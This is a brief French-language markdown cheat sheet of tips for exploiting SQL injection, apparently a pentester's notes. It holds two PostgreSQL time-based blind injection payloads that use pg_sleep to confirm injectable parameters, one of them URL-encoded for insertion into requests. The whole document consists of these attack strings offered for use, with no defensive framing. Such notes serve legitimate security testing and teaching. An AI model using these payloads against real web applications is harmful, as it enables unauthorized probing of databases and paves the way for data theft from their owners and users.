# Injections SQL

> Tips pour l'exploitation d'injections SQL



### 1. Payloads

- **Blind** (postgresql) : 

```sql
0 and (123456=(select 123456 from pg_sleep(20)))
```

```sql
0+and+('a'=(SELECT+case+when(1=1)+then+cast(PG_SLEEP(60)as+varchar)+else+'a'+end))
```

